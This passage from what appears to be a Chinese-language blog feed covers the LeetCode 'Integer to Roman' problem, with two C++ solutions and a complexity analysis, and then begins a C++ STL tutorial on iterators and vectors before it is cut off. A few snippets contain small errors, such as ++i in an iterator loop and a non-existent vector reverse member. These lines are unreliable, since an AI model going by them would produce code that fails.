        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/12/question.png"><br><img src="/img/LeetCode/12/question2.png"></p><ul><li>題目難度：<code>Medium</code></li><li>題目敘述：題目主要需求是將輸入的整數 <code>num</code> 轉換成對應的羅馬數字符號，並給定一個對應表，在轉換過程有幾項轉換規則：<ul><li>羅馬數字是通過從最高位到最低位將小數位值的轉換連接起來形成的</li><li>如果該值不以4或9開頭,則選擇可以從輸入中減去的最大值的符號,將該符號附加到結果中,減去其值,然後將剩餘部分轉換為羅馬數字。</li><li>如果該值以4或9開頭,則使用表示從下一個符號中減去一個符號的減法形式,例如,4是 5(<code>V</code>)減去1(<code>I</code>):<code>IV</code>,而9是10(<code>X</code>)減去1(<code>I</code>):<code>IX</code>。只使用以下減法形式:4(<code>IV</code>)、9(<code>IX</code>)、40(<code>XL</code>)、90(<code>XC</code>)、400(<code>CD</code>)和900(<code>CM</code>)。</li><li>只有10的次方(<code>I</code>、<code>X</code>、<code>C</code>、<code>M</code>)可以最多連續附加3次以表示10的倍數。不能多次附加5(<code>V</code>)、50(<code>L</code>)或500(<code>D</code>)。如果需要附加4次符號,需使用減法形式</li></ul></li><li>限制： <code>1 &lt;= num &lt;= 3999</code></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>我其實一開始偏向暴力解，就根據條件去個別判斷，然後從數字的高位數開始判斷並轉換符號，已經轉過的數字就減掉</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">intToRoman</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> counter=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    string results;</span><br><span class="line">    <span class="comment">// 1000-3000</span></span><br><span class="line">    value = num /<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;value;i++)&#123;</span><br><span class="line">        results+= <span class="string">&#x27;M&#x27;</span>;   </span><br><span class="line">    &#125;</span><br><span class="line">    num = num - value * <span class="number">1000</span>;</span><br><span class="line">    <span class="comment">// 100 - 900</span></span><br><span class="line">    <span class="keyword">if</span> (num / <span class="number">100</span> !=<span class="number">4</span> &amp;&amp; num /<span class="number">100</span> !=<span class="number">9</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (num &gt; <span class="number">500</span>)&#123;</span><br><span class="line">            value = (num - <span class="number">500</span>)/<span class="number">100</span>;</span><br><span class="line">            results += <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; value; i++)&#123;</span><br><span class="line">                results += <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            num = num - <span class="number">500</span> - <span class="number">100</span> * value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (num &lt; <span class="number">500</span>)&#123;</span><br><span class="line">            value = num/<span class="number">100</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt; value; i++)&#123;</span><br><span class="line">                results += <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            num = num - <span class="number">100</span>* value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            results += <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">            num = num <span class="number">-500</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (num/<span class="number">100</span> == <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="comment">// insert 400</span></span><br><span class="line">        results +=<span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">        results += <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">        num = num - <span class="number">400</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (num/<span class="number">100</span> == <span class="number">9</span>)&#123;</span><br><span class="line">        results += <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">        results += <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line">        num = num <span class="number">-900</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 10 - 90</span></span><br><span class="line">    <span class="keyword">if</span>(num / <span class="number">10</span> !=<span class="number">4</span> &amp;&amp; num /<span class="number">10</span> !=<span class="number">9</span> )&#123;</span><br><span class="line">        <span class="keyword">if</span>(num &gt; <span class="number">50</span>)&#123;</span><br><span class="line">            results += <span class="string">&#x27;L&#x27;</span>;</span><br><span class="line">            value = (num<span class="number">-50</span>)/<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; value; i++)&#123;</span><br><span class="line">                results += <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            num = num - <span class="number">50</span> - <span class="number">10</span> * value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (num &lt; <span class="number">50</span>)&#123;</span><br><span class="line">            value = num /<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; value; i++)&#123;</span><br><span class="line">                results += <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            num = num  - <span class="number">10</span> * value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            results += <span class="string">&#x27;L&#x27;</span>;</span><br><span class="line">            num = num <span class="number">-50</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (num /<span class="number">10</span> ==<span class="number">4</span>)&#123;</span><br><span class="line">        results += <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">        results += <span class="string">&#x27;L&#x27;</span>;</span><br><span class="line">        num = num - <span class="number">40</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (num /<span class="number">10</span> ==<span class="number">9</span>)&#123;</span><br><span class="line">        results += <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">        results += <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">        num = num - <span class="number">90</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1 - 9</span></span><br><span class="line">    <span class="keyword">if</span>(num !=<span class="number">4</span> &amp;&amp; num !=<span class="number">9</span> )&#123;</span><br><span class="line">        <span class="keyword">if</span> (num &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            results += <span class="string">&#x27;V&#x27;</span>;</span><br><span class="line">            value = num <span class="number">-5</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt; value; i++)&#123;</span><br><span class="line">                results += <span class="string">&#x27;I&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (num &lt; <span class="number">5</span>)&#123;</span><br><span class="line">            value = num;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt; value; i++)&#123;</span><br><span class="line">                results += <span class="string">&#x27;I&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            results += <span class="string">&#x27;V&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(num == <span class="number">4</span>)&#123;</span><br><span class="line">        results += <span class="string">&#x27;I&#x27;</span>;</span><br><span class="line">        results += <span class="string">&#x27;V&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (num ==<span class="number">9</span>)&#123;</span><br><span class="line">        results += <span class="string">&#x27;I&#x27;</span>;</span><br><span class="line">        results += <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>從最高位的 1000 - 3000 開始處理，判斷最高位的數字，並且將 <code>results</code> 添加相對應個數的 <code>M</code></li><li>接著判斷百位數，首先處理400 以及 900 外的狀況，並且分別考慮 &gt;500 以及 &lt; 500 和 &#x3D; 500 的三種狀況，如果有500則需要額外在 <code>results</code> 添加 <code>D</code> 並且<code>num</code> 需要額外扣掉500</li><li>分別處理 400 和 900的狀況</li><li>接著處理十位數，一樣先處理 40, 90外的狀況，並且分別考慮 &gt;50, &lt;50 和 &#x3D;50 三種狀況，若有50則需額外在 <code>results</code> 添加 <code>L</code>,並且<code>results</code>要扣掉50</li><li>最後處理個位數</li><li>回傳結果</li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/12/results.png"></p><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">intToRoman</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        string results=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>, string&gt;&gt; RomanDict = &#123;&#123;<span class="number">1000</span>, <span class="string">&quot;M&quot;</span>&#125;, &#123;<span class="number">900</span>, <span class="string">&quot;CM&quot;</span>&#125;, &#123;<span class="number">500</span>, <span class="string">&quot;D&quot;</span>&#125;, &#123;<span class="number">400</span>, <span class="string">&quot;CD&quot;</span>&#125;, &#123;<span class="number">100</span>, <span class="string">&quot;C&quot;</span>&#125;, &#123;<span class="number">90</span>, <span class="string">&quot;XC&quot;</span>&#125;, &#123;<span class="number">50</span>, <span class="string">&quot;L&quot;</span>&#125;, &#123;<span class="number">40</span>, <span class="string">&quot;XL&quot;</span>&#125;, &#123;<span class="number">10</span>, <span class="string">&quot;X&quot;</span>&#125;, &#123;<span class="number">9</span>, <span class="string">&quot;IX&quot;</span>&#125;, &#123;<span class="number">5</span>, <span class="string">&quot;V&quot;</span>&#125;, &#123;<span class="number">4</span>, <span class="string">&quot;IV&quot;</span>&#125;, &#123;<span class="number">1</span>, <span class="string">&quot;I&quot;</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt; RomanDict.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">while</span> (num &gt;= RomanDict[i].first)&#123;</span><br><span class="line">                results += RomanDict[i].second;</span><br><span class="line">                num -= RomanDict[i].first;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>另一種做法就是透過實作 Hash Table，這裡可以透過 C++ STL 中的 pair 容器去建立對應的字典，並且透過迴圈在判斷數字是否大於字典中的key欄位(數字)，如果大於等於該Key，則就在results 添加對應的符號，並且將num 扣除已經添加的數字<br>如此迭代下來，得出的結果也會是我們要的羅馬字串。</p><blockquote><p>在 Pair 中，可以透過 <code>first</code> 代表第一個元素，也就是key，<code>second</code> 可代表第二個元素，也就是 value</p></blockquote><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/12/results2.png"></p><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><p>這裡可以分析最佳解的複雜度</p><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>這段代碼的時間複雜度為 $O(1)$</p><p>外層的 for 循環遍歷了 <code>RomanDict</code> 向量,向量的大小是固定的 13,所以循環執行的次數是常數時間 $O(1)$<br>內層的 while 循環的執行次數取決於輸入數字 num 的大小。然而,由於輸入範圍是有限的 (1 &lt;&#x3D; num &lt;&#x3D; 3999),因此內層循環的執行次數也是有限的。<br>在最壞的情況下,內層循環需要執行的次數與輸入數字的位數成正比。由於輸入範圍有限,位數也是有限的,因此內層循環的時間複雜度是常數時間 $O(1)$<br>總的來說,無論輸入數字是多少,程式碼的執行時間都是固定的,因此時間複雜度為常數時間 $O(1)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>這段代碼的空間複雜度為 $O(1)$</p><p>程式碼中使用了一個固定大小的向量 <code>RomanDict</code> 來存儲羅馬數字及其對應的值,它的大小為 13,不隨輸入的變化而變化。<br>輸出字符串 <code>results</code> 的大小最多為 15 個字符(對應最大的羅馬數字”MMMCMXCIX”),這也是一個固定的常數空間。<br>因此,無論輸入數字是多少,代碼所需的額外空間都是固定的,因此空間複雜度為常數空間 $O(1)$</p><p>至於原本暴力解的複雜度在，輸入範圍提高的時候，複雜度也會隨之增加，如果需要支持更大範圍的輸入,當輸入數字 num 的大小增加時,這段代碼的時間複雜度將會變為 $O(logn)$,其中 n 是輸入數字的大小。</p><h1 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h1><p>[1] <a href="https://blog.techbridge.cc/2017/01/21/simple-hash-table-intro/">https://blog.techbridge.cc/2017/01/21/simple-hash-table-intro/</a><br>[2] <a href="https://shengyu7697.github.io/std-unordered_map/">https://shengyu7697.github.io/std-unordered_map/</a><br>[3] <a href="https://leozzmc.github.io/posts/efa232a7.html#Map-%E5%92%8C-MulitMap">https://leozzmc.github.io/posts/efa232a7.html#Map-%E5%92%8C-MulitMap</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ 刷題利器 - STL (Standard Template Library) | LeetCode</title>
      <link href="/posts/efa232a7.html"/>
      <url>/posts/efa232a7.html</url>
      
        <content type="html"><![CDATA[<h1 id="甚麼是-STL-Standard-Template-Library"><a href="#甚麼是-STL-Standard-Template-Library" class="headerlink" title="甚麼是 STL (Standard Template Library)?"></a>甚麼是 STL (Standard Template Library)?</h1><p>在 C++ 中，STL即為一群容器(Container)的集合，不同容器可以實現不同的資料結構，其實是大量使用了 C++中的 Template 來去實現的。<br>透過該資料結構實現出演算法，STL還提供對於容器的操作，不同資料結構的容器分別也有不同的操作方式。</p><blockquote><p>Template 簡單來說就是定義好結構，並且可用於不同的資料型別上，例如我寫了一個陣列的Template，但它可以是 int[], float[], double [] 或者是 char []<br><code>template &lt;typename T&gt;</code> 通常可以這樣來定義 Template ，通常使指角括號內的東西，可以想像成compiler 幫你做複製貼上</p></blockquote><h1 id="STL-元件"><a href="#STL-元件" class="headerlink" title="STL 元件"></a>STL 元件</h1><p>主要有6大個元件:</p><ul><li>容器 (Container)</li><li>演算法 (Algorithm)</li><li>迭代器（Iterator）</li><li>仿函數（Function object）</li><li>適配器（Adaptor）</li><li>空間配置器（allocator）</li></ul><blockquote><p>對於刷題，最需要focus的重點會是容器和迭代器，另外還有algorithm，例如 <code>sort</code>，通常以 function 的形式存在，多是一次性的計算，但Leetcode中大多需要自己實作，因此不細談</p></blockquote><h1 id="STL-容器"><a href="#STL-容器" class="headerlink" title="STL 容器"></a>STL 容器</h1><p><strong>container 通常是屬於資料結構的部份，以變數的方式存在，可持續地互動與維護資料</strong></p><p><img src="/img/LeetCode/C++_STL/containers.jpg"></p><p>其中Leetcode 能使用的容器類型有: <strong>Vector</strong>, <strong>List</strong>, <strong>Stack</strong>, <strong>Queue</strong>, <strong>PriorityQueue(Binary Heap)</strong>, <strong>Set&#x2F;MultiSet</strong>, <strong>Unorder Set</strong>, <strong>Map&#x2F;MultiMap</strong>, <strong>Unorder Map</strong></p><h1 id="STL-迭代器"><a href="#STL-迭代器" class="headerlink" title="STL 迭代器"></a>STL 迭代器</h1><p><strong>iterator 用來依序拜訪一個 container 的所有元素，也用以指稱 container 中的特定元素，可表達搜尋結果或者範圍的端點</strong></p><p>下面是範例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n, i;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">    <span class="keyword">while</span> (cin &gt;&gt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        v.<span class="built_in">resize</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; v[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator it=v.<span class="built_in">begin</span>(); it!=v.<span class="built_in">end</span>(); ++it)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; *it &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>取自: <a href="https://hackmd.io/@sa072686/cp/%2F%40sa072686%2FS11uDpiuH">https://hackmd.io/@sa072686/cp/%2F%40sa072686%2FS11uDpiuH</a></p></blockquote><p>可以看到在<code>for</code> 迴圈內可以使用 <code>vector&lt;int&gt;::iterator</code> 來去宣告一個迭代器 <code>it</code>，並且它會從 vector 的首端開始，若不等於尾端則+1；</p><p>這裡可以觀察到幾個重點:</p><ol><li>iterator 的宣告方式是 <code>容器類型::iterator</code></li><li>iterator 支援 <code>++</code> 或 <code>--</code> 運算</li><li><strong>支援 iterator 的 container，基本都能用 <code>.begin()</code> 取得最初的元素，<code>.end()</code> 取得最後的元素的再下一個位置，是個不存在的空位，符合 STL 左包含、右不包含的規則</strong></li><li>透過取值運算子 <code>*</code> 可以取得iterator目前位址的值</li></ol><blockquote><p>大多數的時候，把它理解為指標是沒有問題的（指標是迭代器的一個特例，它也屬於迭代器）</p></blockquote><h2 id="auto-自動型別判別"><a href="#auto-自動型別判別" class="headerlink" title="auto 自動型別判別"></a>auto 自動型別判別</h2><p>上面的範例會發現一件事，就是宣告 iterator的時候真的長度很長，因此有個偷懶作法就是透過 <code>auto</code> 來讓compiler來進行自動型別判別，<strong>compiler 會依據初始值的型別來決定變數的型別</strong></p><p>可以將for迴圈改成下面這樣</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it=v.<span class="built_in">begin</span>(); it!=v.<span class="built_in">end</span>(); ++i)&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>對於 <code>vector</code> 來說，這算是一種random access 的 iterator，甚麼事random access?</p><h2 id="Random-Access"><a href="#Random-Access" class="headerlink" title="Random Access"></a>Random Access</h2><p><strong>若一個 container 可以在 $O(1)$ 複雜度進行存取，則它就具有 random access 的特性</strong></p><p>如果是為了刷題，會使用到的迭代器也隨著容器種類有所不同，可以參考下面表格</p><table><thead><tr><th>Iterator Type</th><th>Description</th><th>Container</th></tr></thead><tbody><tr><td>Bidirectional iterator</td><td>Read and Writes forward and backward</td><td>list,set,multiset,map,multimap</td></tr><tr><td>Random access iterator</td><td>Read and Write with random access</td><td>vector,deque,array,string</td></tr></tbody></table><h1 id="常見-STL-容器"><a href="#常見-STL-容器" class="headerlink" title="常見 STL 容器"></a>常見 STL 容器</h1><h2 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h2><p>可以想成是一個動態的陣列</p><ul><li>可以在 $O(1)$ 時間內存取跟修改元素</li><li>在集合的中間修改元素會是 $O(n)$，<strong>一般建議將要刪除的值先swap到最後，然後再刪除。</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="Vector-初始化"><a href="#Vector-初始化" class="headerlink" title="Vector 初始化"></a>Vector 初始化</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 宣告一個 int vector</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 宣告一個長度為N的 T型別的 Vector</span></span><br><span class="line"><span class="function">vector&lt;T&gt; <span class="title">v</span><span class="params">(n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 宣告一個長度為N的 int Vector，並且初始化成 0</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v</span><span class="params">(n,<span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 將set中的資料初始化成 vector</span></span><br><span class="line"><span class="function">vector&lt;T&gt; <span class="title">v</span><span class="params">(s.begin(), s.end())</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Subvector</span></span><br><span class="line"><span class="function">vector&lt;T&gt; <span class="title">sub</span><span class="params">(v.begin(),v.begin()+<span class="number">5</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2維Vector</span></span><br><span class="line">vector&lt;vector&lt;T&gt;&gt; v2d;</span><br><span class="line"></span><br><span class="line"><span class="comment">//宣告一個2維Vector，大小為 nxm</span></span><br><span class="line">vector&lt;vector&lt;T&gt;&gt; <span class="built_in">v_2d1</span>(n, <span class="built_in">vector</span>&lt;T&gt;(m));</span><br></pre></td></tr></table></figure><h3 id="Vector-常見操作"><a href="#Vector-常見操作" class="headerlink" title="Vector 常見操作"></a>Vector 常見操作</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v.<span class="built_in">empty</span>();</span><br><span class="line">v.<span class="built_in">size</span>();</span><br><span class="line">v.<span class="built_in">front</span>();</span><br><span class="line">v.<span class="built_in">back</span>();</span><br><span class="line"></span><br><span class="line">v.<span class="built_in">push_back</span>();    <span class="comment">// 將obj推到vector的最後端</span></span><br><span class="line">v.<span class="built_in">pop_back</span>();  <span class="comment">// 將vector的最後端obj移除</span></span><br><span class="line">v.<span class="built_in">insert</span>();      <span class="comment">// 插入到指定位置</span></span><br><span class="line">v.<span class="built_in">insert</span>(v.<span class="built_in">begin</span>(), target); <span class="comment">// 加入target到最前面</span></span><br><span class="line">v.<span class="built_in">insert</span>(v.<span class="built_in">begin</span>() + n, target); <span class="comment">// 加入taret到任意位置, n &lt;= v.size()</span></span><br><span class="line">v1.<span class="built_in">insert</span>(v1.<span class="built_in">end</span>(), v2.<span class="built_in">begin</span>(), v2.<span class="built_in">end</span>()); <span class="comment">// 將 v2 插入到 v1 的最尾端</span></span><br><span class="line">v.<span class="built_in">reverse</span>(first, last); <span class="comment">// 反轉vector從first到last</span></span><br><span class="line">v.<span class="built_in">erase</span>();  <span class="comment">// 移除某個指定位置element</span></span><br><span class="line">v.<span class="built_in">clear</span>();       <span class="comment">// 清除全部element</span></span><br></pre></td></tr></table></figure><p>最後面的 <code>v.erase()</code>，其實如果不在乎順序的話可以改成使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">swap</span>(v[n], v.<span class="built_in">back</span>()); <span class="comment">// 交換n和最後一個位置</span></span><br></pre></td></tr></table></figure><p>剩下還有一些操作</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 